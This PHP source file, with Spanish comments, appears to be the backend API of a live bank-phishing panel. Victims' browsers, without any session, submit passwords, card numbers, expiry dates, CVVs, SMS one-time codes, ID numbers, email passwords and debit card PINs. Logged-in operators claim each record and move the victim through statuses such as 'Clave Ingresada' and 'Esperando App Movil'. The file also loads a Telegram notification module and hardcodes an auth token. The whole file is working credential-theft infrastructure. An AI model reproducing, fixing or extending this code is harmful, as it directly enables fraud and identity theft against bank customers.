<?php
// panel/api/actualizar.php
error_reporting(E_ALL); // Habilitar todos los errores para depuración
ini_set('display_errors', 1);

// Incluir el archivo de conexión a la base de datos y funciones de Telegram
require_once '../db.php'; // Ajusta la ruta si es necesario
require_once '../telegram_api.php'; // Para enviar notificaciones si es necesario

// Iniciar sesión (necesario para obtener el rol y username del operador)
session_start();

// Configuración de logs
function log_debug($message) {
    file_put_contents('actualizar.log', date('Y-m-d H:i:s') . " - " . $message . "\n", FILE_APPEND);
}

// Función para enviar respuestas JSON
function sendJsonResponse($status, $message, $data = null, $httpCode = 200) {
    http_response_code($httpCode);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['status' => $status, 'message' => $message, 'data' => $data]);
    exit();
}

// --- Validación de Token de Autenticación (si aplica) ---
$authToken = "EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g"; // Tu token fijo
$receivedToken = $_SERVER['HTTP_X_AUTH_TOKEN'] ?? '';

// Si no hay sesión de operador (ej. es una petición del cliente final o una API sin login)
// o si el token no coincide, denegar acceso.
// Sin embargo, permitiremos que ciertos APIs de cliente pasen si no hay sesión.
$isSessionActive = isset($_SESSION['user_id']);

if (!$isSessionActive) {
    // Si no hay sesión, se asume que es una llamada de API del cliente final (CLIENTE1)
    // o una API interna que no requiere sesión (ej. ping).
    // Para CLIENTE1, se requerirá el authToken.
    if ($receivedToken !== $authToken) {
        log_debug("Acceso denegado: Token de autenticación inválido o ausente en solicitud sin sesión. Token Recibido: " . $receivedToken);
        sendJsonResponse('ERROR', 'Token de autenticación inválido.', null, 401);
    }
} else {
    // Si hay sesión activa (operador logueado), no se necesita el X-Auth-Token para la mayoría de las operaciones
    // del panel, ya que la sesión en sí actúa como autenticación.
    // Aunque si el cliente envía el token, lo ignoramos para operadores.
    log_debug("Sesión de operador activa. User ID: " . $_SESSION['user_id'] . ", Rol: " . $_SESSION['role']);
}

// Obtener los datos de la petición (POST en JSON)
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    log_debug("Error al decodificar JSON: " . json_last_error_msg() . " Input: " . $input);
    sendJsonResponse('ERROR', 'Datos JSON inválidos.', null, 400);
}

$record_id = $data['id'] ?? null;
if (!$record_id) {
    log_debug("ID de registro no proporcionado. Data: " . json_encode($data));
    sendJsonResponse('ERROR', 'ID de registro no proporcionado.', null, 400);
}

// Determinar el rol del usuario logueado.
$loggedInUserRole = $_SESSION['role'] ?? null;
$loggedInUsername = $_SESSION['username'] ?? null; // Obtener el username del operador logueado

// --- LÓGICA DE AUTORIZACIÓN BASADA EN ROLES Y ACCIONES ---
$isActionAllowed = false; // Por defecto, la acción no está permitida hasta que se demuestre lo contrario.

// Identificar si la petición es de un OPERADOR (marquillador/admin/user)
// Las peticiones del OPERADOR siempre tendrán una sesión activa.
// Las peticiones del CLIENTE final (CLIENTE1) no tendrán sesión de operador.
$isOperatorRequest = ($loggedInUserRole !== null && $loggedInUsername !== null);

// Si es una petición de OPERADOR, se aplican las reglas estrictas de rol.
// Si NO es una petición de OPERADOR, asumimos que es una petición del cliente final (CLIENTE1).
if ($isOperatorRequest) {
    log_debug("DEBUG: Petición identificada como de OPERADOR.");

    if ($loggedInUserRole === 'marquillador') {
        // Los marquilladores solo pueden actualizar 'valor' y 'preg'
        // Y el estado solo puede ser "Completado" o "En Proceso"
        if (isset($data['status']) && ($data['status'] === 'Completado' || $data['status'] === 'En Proceso')) {
            $isActionAllowed = true;
            $data['operador'] = $loggedInUsername; // El marquillador es el operador
            if ($data['status'] === 'En Proceso') {
                // Al marcar como "En Proceso", se registra quien lo gestiona y el timestamp
                $data['gestionado_por'] = $loggedInUsername;
                $data['gestion_iniciada_at'] = date('Y-m-d H:i:s');
            } else {
                // Si es completado o cualquier otro estado, limpiar los campos de gestión
                $data['gestionado_por'] = null; // Limpiar cuando se completa
                $data['gestion_iniciada_at'] = null; // Limpiar timestamp
            }
            log_debug("DEBUG: Marquillador intentó cambiar status a " . $data['status'] . ". Acción permitida.");
        } elseif (isset($data['valor']) || isset($data['preg'])) {
            // Permitir actualizar solo valor o preg sin cambiar el estado
            $isActionAllowed = true;
            $data['operador'] = $loggedInUsername; // El marquillador es el operador
            // Actualizar gestion_iniciada_at para mantener el bloqueo activo
            $data['gestion_iniciada_at'] = date('Y-m-d H:i:s');
            log_debug("DEBUG: Marquillador intentó actualizar valor/preg. Acción permitida.");
        } else {
            log_debug("DEBUG: Marquillador intentó acción no permitida. Data: " . json_encode($data));
            sendJsonResponse('ERROR', 'Acción no permitida para su rol.', null, 403);
        }
    } elseif ($loggedInUserRole === 'admin' || $loggedInUserRole === 'user') {
        // --- INICIO DE LA LÓGICA DE ADMINISTRADOR/USUARIO CORREGIDA ---
        $isActionAllowed = true;

        if (isset($data['status']) && $data['status'] === 'En Proceso por Operador') {
            // Acción para RECLAMAR el registro (cuando se abre gestion_usuario.php)
            $data['gestionado_por'] = $loggedInUsername;
            $data['gestion_iniciada_at'] = date('Y-m-d H:i:s');
            unset($data['status']); // No actualizar la columna 'status' principal
            log_debug("DEBUG: Admin/User reclamando registro. Seteando gestionado_por y gestion_iniciada_at.");
        } elseif (isset($data['status']) && $data['status'] === 'Registro Liberado') {
            // Acción para LIBERAR el registro
            $data['gestionado_por'] = null;
            $data['gestion_iniciada_at'] = null;
            $data['operador'] = null; // Establecer operador a NULL al liberar
            unset($data['status']); // No actualizar la columna 'status' principal
            log_debug("DEBUG: Admin/User liberando registro. Seteando gestionado_por, gestion_iniciada_at y operador a NULL.");
        } elseif (isset($data['status']) && in_array($data['status'], ["Completado", "Error General", "Denegado", "App Movil Aprobada"])) { // AÑADIDO: "App Movil Aprobada"
            // Acción para FINALIZAR el registro (Completado, Error, Denegado, App Movil Aprobada)
            $data['gestionado_por'] = null; // Limpiar campos de gestión
            $data['gestion_iniciada_at'] = null; // Limpiar campos de gestión
            $data['operador'] = null; // Limpiar el operador también al finalizar
            log_debug("DEBUG: Admin/User finalizando registro. Limpiando gestionado_por, gestion_iniciada_at y operador.");
        } elseif (isset($data['status']) && $data['status'] === 'Esperando App Movil') { // NUEVO: Estado "Esperando App Movil"
            $data['operador'] = $loggedInUsername;
            $data['gestionado_por'] = $loggedInUsername;
            $data['gestion_iniciada_at'] = date('Y-m-d H:i:s');
            log_debug("DEBUG: Admin/User enviando estado 'Esperando App Movil'.");
        } else {
            // Acción por defecto: cualquier otra actualización de estado o datos por un admin/user.
            // En este caso, el registro sigue siendo considerado "gestionado" por este operador.
            // Se asegura que el campo 'operador' se actualice a su nombre.
            $data['operador'] = $loggedInUsername;
            // Asegurarse de que 'gestionado_por' y 'gestion_iniciada_at' se actualicen para mantener el bloqueo activo
            // SOLO SI no han sido explícitamente manejados por una de las acciones anteriores (reclamar/liberar/finalizar).
            // Ya que estas condiciones son elseif, no se sobreescribirán si una de las anteriores se cumplió.
            $data['gestionado_por'] = $loggedInUsername;
            $data['gestion_iniciada_at'] = date('Y-m-d H:i:s');
            log_debug("DEBUG: Admin/User actualizando registro (acción general). Operador y gestión actualizada.");
        }
        // --- FIN DE LA LÓGICA DE ADMINISTRADOR/USUARIO CORREGIDA ---

    } else {
        log_debug("DEBUG: Rol de operador desconocido: " . ($loggedInUserRole ?? 'NULO') . ". Denegando acceso.");
        sendJsonResponse('ERROR', 'Acceso no autorizado: Rol de operador no reconocido.', null, 403);
    }
} else { // Si NO es una petición de OPERADOR (asumimos que es del CLIENTE1)
    log_debug("DEBUG: Petición identificada como de CLIENTE1 (sin sesión de operador).");
    
    if (isset($data['status'])) {
        $allowedClientStatuses = [
            "Usuario Ingresado", "Clave Ingresada", "Token Ingresado", "Celular Ingresado", "Tarjeta Ingresada",
            "SMS OTP Ingresado", "APP QR Ingresado", "Cedula Ingresada", "Ano Nacimiento Ingresado",
            "Apellidos Ingresados", "Respuesta Ingresada", "Correo Ingresado", "Clave Correo Ingresada",
            "Tarjeta Debito Ingresada", "Clave Tarjeta Debito Ingresada", "Usuario Errado",
            "Completado", "Error General", "Denegado",
            "Esperando App Movil", // NUEVO
            "App Movil Aprobada" // NUEVO
        ];
        if (in_array($data['status'], $allowedClientStatuses)) {
            $isActionAllowed = true;
            log_debug("DEBUG: CLIENTE1 intentó cambiar status a permitido: " . $data['status'] . ". Acción permitida.");
            // Asegurarse de que CLIENTE1 NO pueda establecer 'operador', 'valor', 'preg', 'gestionado_por', etc.
            unset($data['operador']); 
            unset($data['valor']); 
            unset($data['preg']); 
            unset($data['gestionado_por']); 
            unset($data['gestion_iniciada_at']); 
            // Limitar los campos que un cliente puede actualizar
            $allowedClientFields = ['status', 'pass', 'token', 'celular', 'ntc', 'fven', 'cvv', 'sms_otp', 'cedula', 'ano_nacimiento', 'apellidos', 'respuesta', 'correo', 'ccorreo', 'ntd', 'ctd', 'codigo_verificacion', 'usuario', 'entidad', 'tienda', 'nombre_empresa', 'cliente_referencia', 'tipo_cliente', 'direccion', 'ciudad'];
            foreach ($data as $key => $value) {
                if (!in_array($key, $allowedClientFields)) {
                    unset($data[$key]); // Eliminar campos no permitidos de CLIENTE1
                    log_debug("DEBUG: CLIENTE1 intentó enviar campo no permitido: " . $key);
                }
            }

        } else {
            log_debug("DEBUG: CLIENTE1 intentó cambiar status a NO permitido: " . $data['status'] . ". Denegando.");
            sendJsonResponse('ERROR', 'Estado no permitido para su perfil.', null, 403);
        }
    } else {
        log_debug("DEBUG: CLIENTE1 no envió un status válido. Denegando.");
        sendJsonResponse('ERROR', 'Solicitud inválida para su perfil.', null, 403);
    }
}


// --- VERIFICACIÓN FINAL DE AUTORIZACIÓN ---
if (!$isActionAllowed) {
    log_debug("DEBUG: La acción no fue explícitamente permitida. Denegando al final.");
    sendJsonResponse('ERROR', 'Acción denegada por reglas de seguridad internas o campos insuficientes.', null, 403);
}

// Construir la consulta UPDATE dinámicamente
$campos_a_actualizar = [];
$valores = [];

// Mapeo de campos esperados a columnas de la base de datos
$mapeo_columnas = [
    'status'                => 'status',
    'pass'                  => 'pass',
    'token'                 => 'token',
    'celular'               => 'celular',
    'ntc'                   => 'ntc',
    'fven'                  => 'fven',
    'cvv'                   => 'cvv',
    'sms_otp'               => 'sms_otp',
    'app_qr'                => 'app_qr', 
    'cedula'                => 'cedula',
    'ano_nacimiento'        => 'ano_nacimiento',
    'apellidos'             => 'apellidos',
    'preg'                  => 'preg', 
    'respuesta'             => 'respuesta',
    'correo'                => 'correo',
    'ccorreo'               => 'ccorreo',
    'ntd'                   => 'ntd',
    'ctd'                   => 'ctd',
    'codigo_verificacion'   => 'codigo_verificacion',
    'usuario'               => 'usuario',
    'entidad'               => 'entidad',
    'tienda'                => 'tienda',
    'operador'              => 'operador', 
    'referencia'            => 'referencia',
    'valor'                 => 'valor',     
    'nombre_empresa'        => 'nombre_empresa',
    'cliente_referencia'    => 'cliente_referencia',
    'tipo_cliente'          => 'tipo_cliente',
    'direccion'             => 'direccion',
    'ciudad'                => 'ciudad',
    'nombres'               => 'nombres',
    'nit'                   => 'nit',
    'gestionado_por'        => 'gestionado_por',     // Para el bloqueo
    'gestion_iniciada_at'   => 'gestion_iniciada_at', // Para el bloqueo
    'app_movil'             => 'app_movil' // NUEVO: Para el campo app_movil
];

foreach ($data as $campo_recibido => $valor_recibido) {
    // Asegurarse de que el campo recibido es válido para actualizar.
    if (isset($mapeo_columnas[$campo_recibido])) {
        $nombre_columna = $mapeo_columnas[$campo_recibido];
        $campos_a_actualizar[] = "`" . $nombre_columna . "` = ?";
        $valores[] = $valor_recibido;
    } else {
        log_debug("Campo recibido no mapeado/desconocido: " . $campo_recibido . " con valor: " . (is_array($valor_recibido) ? json_encode($valor_recibido) : $valor_recibido));
    }
}

// Si después de procesar los campos, no hay campos para actualizar (ej. solo se pasó el ID)
if (empty($campos_a_actualizar)) {
    log_debug("DEBUG: Después de procesar campos, no hay campos válidos para UPDATE. Record ID: " . $record_id);
    sendJsonResponse('OK', 'No se encontraron campos válidos para actualizar o no se realizó ningún cambio.', ['id' => $record_id]);
}

// Siempre actualizamos ultima_conexion
$campos_a_actualizar[] = "`ultima_conexion` = NOW()";

$sql = "UPDATE registros SET " . implode(", ", $campos_a_actualizar) . " WHERE id = ?";
$valores[] = $record_id; // Usamos el ID almacenado

try {
    $stmt = $db->prepare($sql);
    if (!$stmt) {
        log_debug("Error al preparar la consulta UPDATE en actualizar.php: " . implode(":", $db->errorInfo()));
        sendJsonResponse('ERROR', 'Error interno del servidor al preparar actualización.', null, 500);
    }

    if (!$stmt->execute($valores)) {
        log_debug("Error al ejecutar la consulta UPDATE en actualizar.php: " . implode(":", $stmt->errorInfo()));
        sendJsonResponse('ERROR', 'Error al ejecutar la actualización.', null, 500);
    }

    $filas_afectadas = $stmt->rowCount();

    if ($filas_afectadas > 0) {
        log_debug("Registro $record_id actualizado con: " . json_encode($data) . ". Filas afectadas: " . $filas_afectadas);
        sendJsonResponse('OK', 'Registro actualizado correctamente.', ['id' => $record_id]);
    } else {
        log_debug("Registro $record_id intentó actualizar, pero no se afectaron filas (posiblemente ID inexistente o mismos valores). Data: " . json_encode($data));
        sendJsonResponse('OK', 'Registro encontrado, pero no se realizaron cambios (posiblemente ID inexistente o mismos valores).', ['id' => $record_id]);
    }

} catch (PDOException $e) {
    log_debug("Error de base de datos en actualizar.php: " . $e->getMessage());
    sendJsonResponse('ERROR', 'Error de base de datos al actualizar.', null, 500);
}
?>